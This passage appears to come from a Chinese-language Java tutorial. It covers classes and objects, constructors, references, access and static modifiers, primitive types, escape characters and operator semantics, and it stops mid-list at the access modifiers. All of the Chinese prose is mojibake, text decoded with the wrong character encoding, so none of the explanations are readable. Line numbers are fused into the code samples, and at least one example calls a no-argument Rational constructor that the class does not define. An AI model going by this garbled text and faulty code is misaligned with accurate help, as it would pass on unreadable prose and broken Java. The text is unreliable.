public static void main(String[] args) &#123; Person p = new Person(); // åˆ›å»ºå¯¹è±¡ p.name = &quot;Alice&quot;; p.age = 20; p.sayHello(); // è°ƒç”¨æ–¹æ³• &#125;&#125; è€Œå¯¹è±¡æœ‰ç€ä¸‰ä¸ªæ ¸å¿ƒç‰¹å¾ï¼š èº«ä»½ï¼š å±æ€§å¯ä»¥å‘ç”Ÿå˜åŒ–ï¼Œä½†èº«ä»½ä¸ä¼šã€‚æ¯”å¦‚è¯´åå­—ï¼Œèº«ä»½è¯å·ç­‰ã€‚ çŠ¶æ€ï¼š å½“å‰æ‰€æœ‰å±æ€§çš„é›†åˆã€‚æ¯”å¦‚è¯´èº«é«˜ä½“é‡ç­‰ã€‚ è¡Œä¸ºï¼š è¿›è¡Œä¼šä¿®æ”¹å½“å‰çŠ¶æ€çš„æ“ä½œã€‚å¦‚åƒé¥­ï¼Œå–æ°´ç­‰ã€‚ æ„é€ å‡½æ•° æ˜¯ä¸€ç§ç‰¹æ®Šæ–¹æ³•ï¼Œä¸ new è”åˆä½¿ç”¨ã€‚ åå­—å’Œç±»åç›¸åŒï¼Œæ²¡æœ‰è¿”å›ç±»å‹ã€‚ å¦‚æœä¸€ä¸ªç±»é‡Œä¸å†™ä»»ä½•æ„é€ å‡½æ•°ï¼ŒJava è‡ªåŠ¨ç»™ä½ ç”Ÿæˆä¸€ä¸ªæ— å‚çš„â€œé»˜è®¤æ„é€ å‡½æ•°â€ã€‚ ä¾‹å­ï¼š 12345678class Rational &#123; private int numerator, denominator; Rational(int z, int n) &#123; // æ„é€ å‡½æ•° numerator = z; denominator = n; &#125;&#125; è°ƒç”¨ï¼š 1Rational a = new Rational(3, 4); å¼•ç”¨/reference123Rational a = new Rational(3, 4);Rational b = a; // b å’Œ a æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ b = a; å¹¶ä¸æ˜¯å¤åˆ¶ä¸€ä»½æ–°å¯¹è±¡ï¼Œåªæ˜¯å¤åˆ¶äº†ä¸€ä»½å¼•ç”¨åœ°å€ï¼Œå³æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ã€‚ æ‰€ä»¥é€šè¿‡ b æ”¹å¯¹è±¡ï¼Œå…¶å®å°±æ˜¯æ”¹ a æŒ‡å‘çš„é‚£ä¸ªå¯¹è±¡ã€‚ å¯¹è±¡ä½œä¸ºå±æ€§æˆ‘ä»¬åŒæ ·ä¹Ÿå¯ä»¥å°†å¯¹è±¡è®¾ç½®æˆå±æ€§ã€‚ï¼ˆç®€å•æ¥è®²å°±æ˜¯å¥—å¨ƒï¼Œå¯¹è±¡å¥—å¯¹è±¡ã€‚ï¼‰ 12345678910111213class Point &#123; double x, y;&#125;class Line &#123; private Point p1; private Point p2; Line(Point p, Point q) &#123; // æ„é€ å‡½æ•° p1 = p; p2 = q; &#125;&#125; ç±»å±æ€§privateprivate ä¿®é¥°çš„æˆå‘˜æ˜¯â€œä»…åœ¨æœ¬ç±»å†…éƒ¨å¯è§â€çš„ï¼šç±»å¤–ä»£ç ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œåªèƒ½é€šè¿‡æœ¬ç±»æä¾›çš„æ–¹æ³•é—´æ¥ä½¿ç”¨ã€‚ æ¯”å¦‚è¯´ 12345678class Rational &#123; private int numerator, denominator; Rational(int z, int n) &#123; // æ„é€ å‡½æ•° numerator = z; denominator = n; &#125;&#125; 1Rational a = new Rational(3, 4); åœ¨å…¶ä»–ç±»é‡Œï¼Œä¸èƒ½ç›´æ¥é€šè¿‡a.numeratoræ¥è®¿é—®açš„åˆ†å­ã€‚ å°½é‡å°†æ‰€æœ‰çš„å±æ€§éƒ½è®¾ç½®æˆprivateã€‚å¯ä»¥æ›´å¥½åœ°ä¿æŠ¤ä»¥åŠç®¡æ§å¯¹è±¡å†…çš„å±æ€§ã€‚ publicprivate ä¿®é¥°çš„æˆå‘˜æ˜¯æ‰€æœ‰ç±»å¯è§ã€‚ æ¯”å¦‚è¯´ï¼š 12345678class Rational &#123; public int numerator, denominator; Rational(int z, int n) &#123; // æ„é€ å‡½æ•° numerator = z; denominator = n; &#125;&#125; é‚£ä¹ˆæ‰€æœ‰ç±»éƒ½å¯ä»¥ç›´æ¥è°ƒç”¨ 123Rational a = new Rational();a.numerator = 3; staticstaticä¿®é¥°çš„æˆå‘˜æ˜¯â€œç±»çº§åˆ«â€çš„ï¼šæ‰€æœ‰å¯¹è±¡å…±äº«ä¸€ä»½ã€‚ ä¾‹å­ï¼šç»Ÿè®¡åˆ›å»ºäº†å¤šå°‘ä¸ª Count å¯¹è±¡ï¼š 123456789class Count &#123; private static int count = 0; // ç±»å±æ€§ private int info; // å¯¹è±¡å±æ€§ public Count() &#123; info = count; count = count + 1; &#125;&#125; count æ˜¯æ•´ä¸ªç±»å…±äº«çš„è®¡æ•°å™¨ã€‚ æ¯æ¬¡ new Count()ï¼Œæ„é€ å‡½æ•°å°±æŠŠå½“å‰ count å€¼å†™åˆ° infoï¼Œç„¶å count++ã€‚ ç»“æœï¼šæ¯ä¸ªå¯¹è±¡çš„ info éƒ½æ˜¯ä¸€ä¸ªå”¯ä¸€çš„ç¼–å· 0,1,2,â€¦ ç›¸åŒ/ç›¸ç­‰ == æ¯”è¾ƒçš„æ˜¯å¼•ç”¨æ˜¯å¦ç›¸åŒï¼ˆæ˜¯ä¸æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼‰ã€‚ æƒ³æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡å†…å®¹æ˜¯å¦ç›¸åŒï¼ˆç›¸ç­‰ï¼Œidenticalï¼‰ï¼Œéœ€è¦å†™è‡ªå·±çš„ equals æ–¹æ³•ï¼Œæ¯”å¦‚ï¼š 123456public class Rational &#123; int zaehler, nenner; public boolean equals(Rational r) &#123; return (zaehler * r.nenner == r.zaehler * nenner); &#125;&#125; å‘½åSunï¼ˆSun Microsystems, Inc.ï¼Œå½“æ—¶å‘æ˜Javaè¯­è¨€å’Œå¹³å°çš„å…¬å¸ï¼‰å¾ˆæ—©å°±ç»™ Java å‡ºäº†ä¸€ä»½å®˜æ–¹ã€ŠCode Conventions for the Java Programming Languageã€‹ï¼Œé‡Œè¾¹æ˜ç¡®æ¨èï¼š ç±»åï¼šUpperCamelCase â†’ ArrayList, StringBuilder æ–¹æ³• / å˜é‡ï¼šlowerCamelCase â†’ loadBefore, userName å¸¸é‡ï¼ˆstatic finalï¼‰ï¼šALL_CAPS_SNAKE_CASE â†’ MAX_VALUE, DEFAULT_TIMEOUT åŒ…åï¼šå…¨å°å†™ç‚¹åˆ† â†’ java.util, org.example.app Java æ ‡å‡†åº“å…¨éƒ¨éµå®ˆè¿™ä¸ªè§„èŒƒï¼š ArrayList, HashMap, getClass(), toString(), System.out.println(), Math.max()â€¦â€¦ æ‰€æœ‰ API éƒ½æ˜¯é©¼å³°é£æ ¼ã€‚ åŸºæœ¬æ•°æ®ç±»å‹Javaè¯­è¨€æä¾›äº†å…«ç§åŸºæœ¬ç±»å‹ã€‚å…­ç§æ•°å­—ç±»å‹ï¼ˆå››ä¸ªæ•´æ•°å‹ï¼Œä¸¤ä¸ªæµ®ç‚¹å‹ï¼‰ï¼Œä¸€ç§å­—ç¬¦ç±»å‹ï¼Œè¿˜æœ‰ä¸€ç§å¸ƒå°”å‹ã€‚ byteï¼š byte æ•°æ®ç±»å‹æ˜¯8ä½ã€æœ‰ç¬¦å·çš„ï¼Œä»¥äºŒè¿›åˆ¶è¡¥ç è¡¨ç¤ºçš„æ•´æ•°ï¼› æœ€å°å€¼æ˜¯ -2^7ï¼› æœ€å¤§å€¼æ˜¯ 2^7-1ï¼› é»˜è®¤å€¼æ˜¯ 0ï¼› byte ç±»å‹ç”¨åœ¨å¤§å‹æ•°ç»„ä¸­èŠ‚çº¦ç©ºé—´ï¼Œä¸»è¦ä»£æ›¿æ•´æ•°ï¼Œå› ä¸º byte å˜é‡å ç”¨çš„ç©ºé—´åªæœ‰ int ç±»å‹çš„å››åˆ†ä¹‹ä¸€ï¼› ä¾‹å­ï¼šbyte a = 100ï¼Œbyte b = -50ã€‚ shortï¼š short æ•°æ®ç±»å‹æ˜¯ 16 ä½ã€æœ‰ç¬¦å·çš„ä»¥äºŒè¿›åˆ¶è¡¥ç è¡¨ç¤ºçš„æ•´æ•° æœ€å°å€¼æ˜¯ -2^15ï¼› æœ€å¤§å€¼æ˜¯ 2^15 - 1ï¼› Short æ•°æ®ç±»å‹ä¹Ÿå¯ä»¥åƒ byte é‚£æ ·èŠ‚çœç©ºé—´ã€‚ä¸€ä¸ªshortå˜é‡æ˜¯intå‹å˜é‡æ‰€å ç©ºé—´çš„äºŒåˆ†ä¹‹ä¸€ï¼› é»˜è®¤å€¼æ˜¯ 0ï¼› ä¾‹å­ï¼šshort s = 1000ï¼Œshort r = -20000ã€‚ intï¼š int æ•°æ®ç±»å‹æ˜¯32ä½ã€æœ‰ç¬¦å·çš„ä»¥äºŒè¿›åˆ¶è¡¥ç è¡¨ç¤ºçš„æ•´æ•°ï¼› æœ€å°å€¼æ˜¯ -2^31ï¼› æœ€å¤§å€¼æ˜¯ 2^31 - 1ï¼› ä¸€èˆ¬åœ°æ•´å‹å˜é‡é»˜è®¤ä¸º int ç±»å‹ï¼› é»˜è®¤å€¼æ˜¯ 0 ï¼› ä¾‹å­ï¼šint a = 100000, int b = -200000ã€‚ longï¼š long æ•°æ®ç±»å‹æ˜¯ 64 ä½ã€æœ‰ç¬¦å·çš„ä»¥äºŒè¿›åˆ¶è¡¥ç è¡¨ç¤ºçš„æ•´æ•°ï¼› æœ€å°å€¼æ˜¯ -2^63ï¼› æœ€å¤§å€¼æ˜¯ 2^63 -1ï¼› è¿™ç§ç±»å‹ä¸»è¦ä½¿ç”¨åœ¨éœ€è¦æ¯”è¾ƒå¤§æ•´æ•°çš„ç³»ç»Ÿä¸Šï¼› é»˜è®¤å€¼æ˜¯ 0Lï¼› ä¾‹å­ï¼š long a = 100000Lï¼Œlong b = -200000Lã€‚â€œLâ€ç†è®ºä¸Šä¸åˆ†å¤§å°å†™ï¼Œä½†æ˜¯è‹¥å†™æˆâ€lâ€å®¹æ˜“ä¸æ•°å­—â€1â€æ··æ·†ï¼Œä¸å®¹æ˜“åˆ†è¾©ã€‚æ‰€ä»¥æœ€å¥½å¤§å†™ã€‚ floatï¼š float æ•°æ®ç±»å‹æ˜¯å•ç²¾åº¦ã€32ä½ã€ç¬¦åˆIEEE 754æ ‡å‡†çš„æµ®ç‚¹æ•°ï¼› float åœ¨å‚¨å­˜å¤§å‹æµ®ç‚¹æ•°ç»„çš„æ—¶å€™å¯èŠ‚çœå†…å­˜ç©ºé—´ï¼› é»˜è®¤å€¼æ˜¯ 0.0fï¼› æµ®ç‚¹æ•°ä¸èƒ½ç”¨æ¥è¡¨ç¤ºç²¾ç¡®çš„å€¼ï¼Œå¦‚è´§å¸ï¼› ä¾‹å­ï¼šfloat f1 = 234.5fã€‚ doubleï¼š double æ•°æ®ç±»å‹æ˜¯åŒç²¾åº¦ã€64 ä½ã€ç¬¦åˆ IEEE 754 æ ‡å‡†çš„æµ®ç‚¹æ•°ï¼› æµ®ç‚¹æ•°çš„é»˜è®¤ç±»å‹ä¸º double ç±»å‹ï¼› doubleç±»å‹åŒæ ·ä¸èƒ½è¡¨ç¤ºç²¾ç¡®çš„å€¼ï¼Œå¦‚è´§å¸ï¼› é»˜è®¤å€¼æ˜¯ 0.0dï¼› ä¾‹å­ï¼š 12345double d1 = 7D ;double d2 = 7.; double d3 = 8.0; double d4 = 8.D; double d5 = 12.9867; 7 æ˜¯ä¸€ä¸ª int å­—é¢é‡ï¼Œè€Œ 7Dï¼Œ7. å’Œ 8.0 æ˜¯ double å­—é¢é‡ã€‚ booleanï¼š booleanæ•°æ®ç±»å‹è¡¨ç¤ºä¸€ä½çš„ä¿¡æ¯ï¼› åªæœ‰ä¸¤ä¸ªå–å€¼ï¼štrue å’Œ falseï¼› è¿™ç§ç±»å‹åªä½œä¸ºä¸€ç§æ ‡å¿—æ¥è®°å½• true/false æƒ…å†µï¼› é»˜è®¤å€¼æ˜¯ falseï¼› ä¾‹å­ï¼šboolean one = trueã€‚ charï¼š char ç±»å‹æ˜¯ä¸€ä¸ªå•ä¸€çš„ 16 ä½ Unicode å­—ç¬¦ï¼› æœ€å°å€¼æ˜¯ \\u0000ï¼ˆåè¿›åˆ¶ç­‰æ•ˆå€¼ä¸º 0ï¼‰ï¼› æœ€å¤§å€¼æ˜¯ \\uffffï¼ˆå³ä¸º 65535ï¼‰ï¼› char æ•°æ®ç±»å‹å¯ä»¥å‚¨å­˜ä»»ä½•å­—ç¬¦ï¼› ä¾‹å­ï¼šchar letter = â€˜Aâ€™;ã€‚ é™¤æ­¤ä»¥å¤–è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„å†™æ³•ï¼švarï¼Œä¼šè®©ç¼–è¯‘å™¨ä»å³ä¾§åˆå§‹åŒ–è¡¨è¾¾å¼æ¨æ–­å˜é‡ç±»å‹ã€‚æ¯”å¦‚è¯´var n = 7; n çš„é™æ€ç±»å‹æ˜¯ intã€‚ä½†æ˜¯æ— æ³•ç”¨varåˆå§‹åŒ–ä¸€ä¸ªå˜é‡ï¼Œå³var n;æ˜¯è¿è§„çš„ã€‚ byteã€intã€longã€å’Œshortéƒ½å¯ä»¥ç”¨åè¿›åˆ¶ã€16è¿›åˆ¶ä»¥åŠ8è¿›åˆ¶çš„æ–¹å¼æ¥è¡¨ç¤ºã€‚ å‰ç¼€ 0 è¡¨ç¤º 8 è¿›åˆ¶ï¼Œè€Œå‰ç¼€ 0x ä»£è¡¨ 16 è¿›åˆ¶, ä¾‹å¦‚ï¼š 123int decimal = 100;int octal = 0144;int hexa = 0x64; Stringï¼ˆå­—ç¬¦ä¸²ï¼‰String ä¸æ˜¯åŸºæœ¬ç±»å‹ï¼Œæ˜¯ä¸€ä¸ªç±»ï¼Œä½†ä½¿ç”¨æ–¹å¼æ¯”è¾ƒç‰¹æ®Šï¼š å­—é¢é‡ï¼š&quot;Hello World!&quot; æ‹¼æ¥ï¼š&quot;Hello &quot; + &quot;World&quot; è¿˜æœ‰ä¸€ä¸ªéå¸¸é‡è¦çš„ç‚¹ï¼š ä»»æ„ç±»å‹åœ¨å’Œ String åš + æ—¶ï¼Œä¼šè‡ªåŠ¨è½¬æˆ Stringã€‚ ä¾‹ï¼š 12double x = -0.55e13;System.out.println(&quot;Eine Gleitkomma-Zahl: &quot; + x); ä¼šè¾“å‡ºï¼šEine Gleitkomma-Zahl: -5.5E12ï¼ˆç±»ä¼¼ï¼‰ã€‚ è½¬ä¹‰å­—ç¬¦Javaè¯­è¨€æ”¯æŒä¸€äº›ç‰¹æ®Šçš„è½¬ä¹‰å­—ç¬¦åºåˆ—ã€‚ ç¬¦å· å­—ç¬¦å«ä¹‰ \\n æ¢è¡Œ (0x0a) \\r å›è½¦ (0x0d) \\f æ¢é¡µç¬¦(0x0c) \\b é€€æ ¼ (0x08) \\0 ç©ºå­—ç¬¦ (0x0) \\s ç©ºæ ¼ (0x20) \\t åˆ¶è¡¨ç¬¦ \\&quot; åŒå¼•å· \\&#39; å•å¼•å· \\\\ åæ–œæ  \\ddd å…«è¿›åˆ¶å­—ç¬¦ (ddd) \\uxxxx 16è¿›åˆ¶Unicodeå­—ç¬¦ (xxxx) Operationï¼ˆè¿ç®—ç¬¦ï¼‰ç®—æœ¯è¿ç®—ç¬¦ + - * / % Java åœ¨äºŒå…ƒæ•°å€¼è¿ç®—é‡Œä¼šåšäºŒè¿›åˆ¶æ•°å€¼æå‡ï¼ˆbinary numeric promotionï¼‰ï¼š å…ˆæŠŠæ¯” int å°çš„æ•´å‹ï¼ˆbyte/short/charï¼‰éƒ½æå‡åˆ° intï¼› å†æ ¹æ®ä¸¤ä¸ªæ“ä½œæ•°ä¸­â€œæ›´å¤§çš„ç±»å‹â€ç»Ÿä¸€åˆ° long / float / doubleï¼› ç»“æœç±»å‹å°±æ˜¯æå‡åçš„é‚£ä¸ªç±»å‹ã€‚ ä¾‹å­ï¼š 123int n = 2;long l = 3L;var x = n + l; n æå‡ä¸º longï¼Œç»“æœæ˜¯ longï¼Œx æ¨æ–­ä¸º longï¼Œå€¼ 5Lã€‚ 123int n = 2;double d = 7.0;var x = n + d; n æå‡ä¸º doubleï¼Œç»“æœæ˜¯ doubleï¼Œx æ¨æ–­ä¸º doubleï¼Œå€¼ 9.0ã€‚ 123short s1 = 1;short s2 = 2;short s3 = s1 + s2; æ— æ³•æˆåŠŸç¼–è¯‘ã€‚s1 + s2 å…ˆéƒ½æå‡ä¸º intï¼Œç»“æœæ˜¯ intï¼Œä¸èƒ½éšå¼æ”¾å› shortã€‚ æ­£ç¡®å†™æ³•ï¼šshort s3 = (short)(s1 + s2); æˆ–è€… var s3 = s1 + s2; // s3 æ˜¯ int é™¤æ³• /é™¤æ³•ä¼šåˆ†æˆæ•´é™¤å’Œæµ®ç‚¹é™¤ï¼šä¸¤ä¸ª int/long åšé™¤æ³•å¾—åˆ°æ•´é™¤ï¼ˆå‘é›¶æˆªæ–­ï¼‰ï¼Œåªè¦æœ‰ double/float å‚ä¸å°±æ˜¯æµ®ç‚¹é™¤ã€‚ 1234567double d1 = 7 / 3; // 7/3 å…ˆåšæ•´é™¤å¾— 2ï¼Œå†æ‹“å®½ä¸º 2.0double d2 = 7.0 / 3; // 2.3333333333333335double d3 = 7 / 3.0; // 2.3333333333333335double d4 = 7.0 / 3.0; // 2.3333333333333335double d5 = 3 / 0.5; // 3 æå‡ä¸º double =&gt; 3.0 / 0.5 = 6.0double d6 = 3 / (1/2); // (1/2) æ˜¯æ•´é™¤å¾— 0ï¼Œè¡¨è¾¾å¼å˜æˆ 3/0ï¼ˆintï¼‰=&gt; è¿è¡Œæ—¶æŠ›å‡º ArithmeticException: / by zero ä½†å‡è®¾å³è¾¹çš„å˜é‡éƒ½æ˜¯intï¼Œä½†æˆ‘ä»¬å¸Œæœ›å·¦è¾¹çš„ç»“æœä¸ºdouble / floatæ—¶ï¼Œæˆ‘ä»¬ä¾¿éœ€è¦åœ¨å·¦è¾¹åŠ ä¸Š(double )/(float)æ¥ç¡®ä¿æ•°æ®ç±»å‹ï¼š 1234int x = 7, y = 3;double q0 = x/y; // ç›´æ¥æ•´é™¤å¾—åˆ°2 =&gt; 2.0double q1 = (double) (x / y); // å…ˆæ•´é™¤å¾—åˆ°2ï¼Œå†è½¬ double =&gt; 2.0double q2 = (double) x / y; // å…ˆæŠŠ x å˜ double =&gt; 7.0/3 =&gt; 2.3333333333333335 å–ä½™ï¼ˆ%ï¼‰Java çš„ä½™æ•°ç¬¦å·ä¸å·¦æ“ä½œæ•°ï¼ˆè¢«é™¤æ•°ï¼‰ç›¸åŒï¼Œå¹¶æ»¡è¶³ï¼ša == (a/b)*b + (a%b)ï¼ˆè¿™é‡Œçš„ / ä»æ˜¯å‘é›¶æˆªæ–­ï¼‰ã€‚ 1234567891011int v1 = 11 % 4; // 3int v2 = 0 % 4; // 0int v3 = 4 % 0; // è¿è¡Œæ—¶ ArithmeticException: / by zeroint v4 = -11 % 4; // -3 ï¼ˆ-11/4 == -2ï¼Œä½™æ•° r = -11 - (-2)*4 = -3ï¼‰int v5 = 11 % -4; // 3int v6 = -11 % -4; // -3double v7 = 3.5 % 2; // 1.5double v8 = 3.5 % 2.5; // 1.0double v9 = (22/7) % (19/7); // (22/7)==3ï¼Œ(19/7)==2ï¼Œ3%2==1 =&gt; 1.0 è‡ªå¢/è‡ªå‡ï¼ˆ++/--ï¼‰å‰ç¼€ï¼šå…ˆæ”¹å€¼åå–å€¼ï¼›åç¼€ï¼šå…ˆå–å€¼åæ”¹å€¼ã€‚ 12345678910int n = 5;--n; // n = 4int k = n++ - --n; // å·¦: n++ è¿”å› 4ï¼Œn=&gt;5ï¼›å³: --n å…ˆå‡åˆ° 4 è¿”å› 4ï¼›k=4-4=0ï¼›æ­¤å n=4int l = ++n + n--; // ++n: 5ï¼›n--: å…ˆç”¨ 5 å†å˜ 4ï¼›l=5+5=10ï¼›n=4n = n--; // å³è¾¹è¿”å› 4ï¼Œå†æŠŠ n å‡åˆ° 3ï¼Œç„¶åèµ‹å›å·¦è¾¹ n=4ï¼ˆâ€œè‡ªå‡çš„ç»“æœå€¼â€è¢«èµ‹å›ï¼‰System.out.println(&quot;k = &quot; + k); // 0System.out.println(&quot;l = &quot; + l); // 10System.out.println(&quot;n = &quot; + n); // 4 123456789double d = 3.14;char c = &#x27;L&#x27;;int n1 = (int) d--; // å…ˆå– 3.14 å† d=2.14ï¼›(int)3.14==3int n2 = ++c; // &#x27;L&#x27;-&gt;&#x27;M&#x27;ï¼ˆ77ï¼‰ï¼Œè¡¨è¾¾å¼å€¼æ˜¯ &#x27;M&#x27;ï¼Œèµ‹ç»™ int å¾— 77System.out.println(&quot;d = &quot; + d); // 2.14System.out.println(&quot;c = &quot; + c); // MSystem.out.println(&quot;n1 = &quot; + n1); // 3System.out.println(&quot;n2 = &quot; + n2); // 77 æ¯”è¾ƒè¿ç®—ç¬¦åŸºæœ¬å€¼æ¯”è¾ƒ 12345boolean b1 = 4 == 4.0; // trueï¼ˆ4 æå‡ä¸º 4.0ï¼‰boolean b2 = 7L == (short) 5; // falseï¼ˆ7 != 5ï¼‰boolean b3 = true == 1; // **ä¸é€šè¿‡ç¼–è¯‘**ï¼ˆboolean ä¸èƒ½ä¸æ•´å‹ç”¨ == æ¯”è¾ƒï¼‰boolean b4 = &#x27;d&#x27; == 100; // trueï¼ˆ&#x27;d&#x27; çš„ç ä½æ˜¯ 100ï¼‰boolean b5 = false == b4; // false == true -&gt; false å¼•ç”¨æ¯”è¾ƒï¼ˆå¯¹è±¡ï¼‰ 1234567891011121314151617class A &#123; private int n; public A(int n) &#123; this.n = n; &#125; public int getN() &#123; return n; &#125; public void setN(int n) &#123; this.n = n; &#125;&#125;A a1 = new A(2);A a2 = new A(3); a2.setN(2);A a3 = new A(3 - 1); // 2A a4 = new A(2);A a5 = a1;System.out.println(a1 == a2); // falseï¼ˆä¸åŒå¯¹è±¡ï¼‰System.out.println(a1 == a3); // falseSystem.out.println(a1 == a4); // falseSystem.out.println(a1 == a5); // trueï¼ˆåŒä¸€å¼•ç”¨ï¼‰ == æ¯”è¾ƒçš„æ˜¯å¼•ç”¨æ˜¯å¦åŒä¸€å¯¹è±¡ï¼Œä¸æ˜¯å†…å®¹ã€‚è‹¥æƒ³æŒ‰å†…å®¹æ¯”è¾ƒï¼Œåº”è¦†å†™ equalsã€‚ å­—ç¬¦ä¸²ç›¸ç­‰æ€§ 123456789101112131415String s1 = &quot;abc&quot;;String s2 = &quot;abc&quot;;String s3 = &quot;a&quot; + &quot;b&quot; + &quot;c&quot;; // ç¼–è¯‘æœŸå¸¸é‡æŠ˜å ï¼ŒæŒ‡å‘åŒä¸€å¸¸é‡æ± å¯¹è±¡String s4 = new String(&quot;abc&quot;); // æ˜¾å¼æ–°å»ºå¯¹è±¡String s5 = s1 + &quot;&quot;; // è¿è¡ŒæœŸæ‹¼æ¥ï¼Œé€šå¸¸æ–°å¯¹è±¡System.out.println(&quot;s1 == s2: &quot; + (s1 == s2)); // trueSystem.out.println(&quot;s1 == s3: &quot; + (s1 == s3)); // trueSystem.out.println(&quot;s1 == s4: &quot; + (s1 == s4)); // falseSystem.out.println(&quot;s1 == s5: &quot; + (s1 == s5)); // falseï¼ˆå‡ ä¹æ€»æ˜¯ï¼‰System.out.println(&quot;s1.equals(s2): &quot; + s1.equals(s2)); // trueSystem.out.println(&quot;s1.equals(s3): &quot; + s1.equals(s3)); // trueSystem.out.println(&quot;s1.equals(s4): &quot; + s1.equals(s4)); // trueSystem.out.println(&quot;s1.equals(s5): &quot; + s1.equals(s5)); // true ç»“è®ºï¼šæ¯”è¾ƒå­—ç¬¦ä¸²å†…å®¹ç”¨ equalsï¼Œä¸è¦ç”¨ ==ã€‚ æµ®ç‚¹æ¯”è¾ƒé™·é˜± 12double d = Math.sqrt(2) * Math.sqrt(2);System.out.println(d == 2.0); // å¾€å¾€æ˜¯ falseï¼ˆæµ®ç‚¹è¯¯å·®ï¼‰ è§£å†³ï¼šç”¨è¯¯å·®å®¹å¿ï¼ˆepsilonï¼‰ï¼š 1boolean close = Math.abs(d - 2.0) &lt; 1e-10; é€»è¾‘è¿ç®—ç¬¦çœŸå€¼è¡¨ |ï¼ˆé€»è¾‘æˆ–ï¼Œä¸çŸ­è·¯ï¼‰ï¼š false|false =&gt; false false|true =&gt; true true |false =&gt; true true |true =&gt; true ^ï¼ˆé€»è¾‘å¼‚æˆ–ï¼Œä¸çŸ­è·¯ï¼‰ï¼šä¸¤è¾¹ä¸åŒä¸º true false^false =&gt; false false^true =&gt; true true ^false =&gt; true true ^true =&gt; false ï¼ˆè¡¥å……ï¼š&amp;ã€| æœ‰å¸ƒå°”ç‰ˆï¼ˆä¸çŸ­è·¯ï¼‰ä¸æŒ‰ä½ç‰ˆï¼›&amp;&amp;ã€|| æ˜¯çŸ­è·¯é€»è¾‘ã€‚ï¼‰ çŸ­è·¯ä¸å‰¯ä½œç”¨ 1234567891011int n1 = 7;boolean b1 = n1 &lt; 4 &amp; ++n1 % 2 == 0; // &amp; ä¸çŸ­è·¯ï¼šå³ä¾§å¿…è¯„ä¼°ï¼Œn1 å˜ 8// å·¦å‡å³çœŸ =&gt; b1=falseï¼Œn1==8int n2 = 7;boolean b2 = n2 &lt; 4 &amp;&amp; ++n2 % 2 == 0; // &amp;&amp; çŸ­è·¯ï¼šå·¦è¾¹å·²ä¸ºå‡ï¼Œå³ä¾§ä¸è¯„ä¼°ï¼Œn2 ä» 7System.out.println(&quot;n1 == &quot; + n1); // 8System.out.println(&quot;b1 == &quot; + b1); // falseSystem.out.println(&quot;n2 == &quot; + n2); // 7System.out.println(&quot;b2 == &quot; + b2); // false èµ‹å€¼è¿ç®—ç¬¦ä¸ç»“åˆæ€§æ‰€æœ‰èµ‹å€¼è¿ç®—ç¬¦ï¼ˆ=ã€+=ã€-=ã€...ï¼‰éƒ½æ˜¯å³ç»“åˆï¼šä»å³å¾€å·¦ç®—ã€‚+= ç­‰å¤åˆèµ‹å€¼åœ¨éœ€è¦æ—¶ä¼šéšå¼å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼ˆå…ˆç®—å‡ºå³å€¼ï¼Œå†è½¬æ¢ä¸ºå·¦ä¾§å˜é‡ç±»å‹ï¼‰ã€‚ 1234567int n1 = 1, n2 = 2, n3 = 3;n1 = n2 = n3 = 4;// ç­‰ä»·äºï¼šn3=4; n2=n3; n1=n2;// n1 == 4// n2 == 4// n3 == 4 1234567int n1 = 1, n2 = 2, n3 = 3;n1 += n2 += n3 += 4;// æ­¥éª¤ï¼šn3=3+4=7; n2=2+7=9; n1=1+9=10;// n1 == 10// n2 == 9// n3 == 7 12int n1 = 1, n2 = 2, n3 = 3;n1 += n2 + n3 = 4; // **ä¸é€šè¿‡ç¼–è¯‘** åŸå› ï¼šn2 + n3 ä¸æ˜¯å˜é‡ï¼Œä¸èƒ½ä½œä¸ºèµ‹å€¼å·¦å€¼ã€‚ 1234567int n1 = 1, n2 = 2, n3 = 3;n1 += n2 = n3 + 4; // **å¯ä»¥ç¼–è¯‘**ï¼ˆèµ‹å€¼è¡¨è¾¾å¼æœ‰å€¼ï¼‰// å³ç»“åˆï¼šn2 = 3+4 =&gt; 7ï¼›ç„¶å n1 += 7 =&gt; 8ï¼›n3 ä¿æŒ 3ã€‚// n1 == 8// n2 == 7// n3 == 3 ä¿®é¥°ç¬¦Javaè¯­è¨€æä¾›äº†å¾ˆå¤šä¿®é¥°ç¬¦ï¼Œä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸¤ç±»ï¼š è®¿é—®ä¿®é¥°ç¬¦ éè®¿é—®ä¿®é¥°ç¬¦ ä¿®é¥°ç¬¦ç”¨æ¥å®šä¹‰ç±»ã€æ–¹æ³•æˆ–è€…å˜é‡ï¼Œé€šå¸¸æ”¾åœ¨è¯­å¥çš„æœ€å‰ç«¯ã€‚æˆ‘ä»¬é€šè¿‡ä¸‹é¢çš„ä¾‹å­æ¥è¯´æ˜ï¼š 123456789public class ClassName &#123; // ...&#125;private boolean myFlag;static final double weeks = 9.5;protected static final int BOXWIDTH = 42;public static void main(String[] arguments) &#123; // æ–¹æ³•ä½“&#125; è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦Javaä¸­ï¼Œå¯ä»¥ä½¿ç”¨è®¿é—®æ§åˆ¶ç¬¦æ¥ä¿æŠ¤å¯¹ç±»ã€å˜é‡ã€æ–¹æ³•å’Œæ„é€ æ–¹æ³•çš„è®¿é—®ã€‚Java æ”¯æŒ 4 ç§ä¸åŒçš„è®¿é—®æƒé™ã€‚ default (å³é»˜è®¤ï¼Œä»€ä¹ˆä¹Ÿä¸å†™ï¼‰: åœ¨åŒä¸€åŒ…å†…å¯è§ï¼Œä¸ä½¿ç”¨ä»»ä½•ä¿®é¥°ç¬¦ã€‚ä½¿ç”¨å¯¹è±¡ï¼šç±»ã€æ¥å£ã€å˜é‡ã€æ–¹æ³•ã€‚ private : åœ¨åŒä¸€ç±»å†…å¯è§ã€‚ä½¿ç”¨å¯¹è±¡ï¼šå˜é‡ã€æ–¹æ³•ã€‚ æ³¨æ„ï¼šä¸èƒ½ä¿®é¥°ç±»ï¼ˆå¤–éƒ¨ç±»ï¼‰ public : å¯¹æ‰€æœ‰ç±»å¯è§ã€‚ä½¿ç”¨å¯¹è±¡ï¼šç±»ã€æ¥å£ã€å˜é‡ã€æ–¹æ³• protected : 